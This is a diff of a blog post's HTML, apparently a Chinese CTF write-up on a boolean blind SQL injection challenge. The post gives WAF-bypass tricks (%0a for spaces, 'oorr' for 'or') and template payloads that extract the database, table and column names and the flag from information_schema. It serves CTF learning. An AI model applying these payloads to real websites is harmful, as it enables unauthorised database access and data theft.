@@ -415,33 +415,24 @@
 <p>拿到题目，先尝试分析，在框内输入1，网页显示<code>you are in...</code><br>接着在框内输入0，网页显示<code>you are not in...</code></p>
 <p>接着尝试输入<code>0&#39; or &#39;1&#39;=&#39;1</code>，网页反馈信息<code>Sql injection detected!</code>，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测试，如下图所示：</p>
 <img src="/2019/07/05/CTF题目-认真一点/1.png">
-
 <p>可知可以用的符号是<code>or,=,(,),&#39;,&quot;</code><br>被屏蔽的符号为<code>and,,,substring,union,#,|</code>另外空格添加在字符中间也会被屏蔽</p>
 <p>因此可以看出本体的解题思路是使用布尔盲注。。</p>
 <p>我们首先用%0a代替空格进行注入，命令为<code>id=1&#39;%0aor%0a&#39;1&#39;=&#39;1</code>，结果为<code>you are not in...</code><br>这说明用%0a代替空格的方案是正确的，但是可能or在处理中被删除了，因此用oorr来代替or进行注入，结果显示成功，由此开始布尔注入的过程。</p>
 <p>接下来的过程中，我们用oorr替换or，并且把空格替换成%0a</p>
 <h2 id="获取数据库名称长度和数据库名称"><a href="#获取数据库名称长度和数据库名称" class="headerlink" title="获取数据库名称长度和数据库名称"></a>获取数据库名称长度和数据库名称</h2><p>构造payload获取名称长度：<br><code>0&#39; or (length(database())=%s) or&#39;0</code></p>
 <p>构造获取名称的payload:<br><code>0&#39; or (mid(database() from %s for 1))=&#39;%s&#39; or &#39;0</code></p>
-<p>爆破的结果如下图所示：</p>
-<img src="/2019/07/05/CTF题目-认真一点/2.png">
-
+<p>爆破的结果如下图所示：<br><img src="/2019/07/05/CTF题目-认真一点/2.png"></p>
 <p>可知获取到的数据库名称为<code>ctf_sql_bool_blind</code></p>
 <h2 id="获取表名的长度和名称"><a href="#获取表名的长度和名称" class="headerlink" title="获取表名的长度和名称"></a>获取表名的长度和名称</h2><p>构造payload获取长度：<br><code>0&#39; or (length((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database()))=%s) or&#39;0</code></p>
 <p>获取名称的payload为：<br><code>0&#39; or (mid((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database())from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
-<p>爆破结果如下：</p>
-<img src="/2019/07/05/CTF题目-认真一点/3.png">
-
+<p>爆破结果如下：<br><img src="/2019/07/05/CTF题目-认真一点/3.png"></p>
 <p>由上图可知，该数据库下由两张表，分别是fiag和users，因为在最开始没有在group_concat里面加separator ‘@’，所以两个名称都连在一起了，原因是默认的分隔符不知道是什么，所以程序就跳过了分隔符。</p>
 <h2 id="获取字段名称长度和名称"><a href="#获取字段名称长度和名称" class="headerlink" title="获取字段名称长度和名称"></a>获取字段名称长度和名称</h2><p>构造获取长度的payload:<br><code>0&#39; or (length((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;))=%s) or&#39;0</code></p>
 <p>获取内容的payload:<br><code>0&#39; or (mid((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;)from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
-<p>爆破结果如下：</p>
-<img src="/2019/07/05/CTF题目-认真一点/4.png">
-
+<p>爆破结果如下：<br><img src="/2019/07/05/CTF题目-认真一点/4.png"></p>
 <h2 id="获取flag的长度和内容"><a href="#获取flag的长度和内容" class="headerlink" title="获取flag的长度和内容"></a>获取flag的长度和内容</h2><p>获取长度的payload:<br><code>0&#39; or (length((select %s from %s))=%s) or&#39;0</code></p>
 <p>获取内容的payload:<br><code>0&#39; or (mid((select %s from %s)from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
-<p>爆破结果如下：</p>
-<img src="/2019/07/05/CTF题目-认真一点/5.png">
-
+<p>爆破结果如下：<br><img src="/2019/07/05/CTF题目-认真一点/5.png"></p>
 <p>这里多加了两位长度，因为在提交的时候发现爆破出来的flag一直报错，多加了两位后发现后面无论多少位<code>-</code>都能匹配上，因此认定中间的<code>-</code>可能是另外的符号转化的。</p>
 <p>通过使用ascii()函数来确定该字符的确切ascii码，发现该字符是空格，因为空格已经被屏蔽了，所以用等号来确定是无法确定的。</p>
 
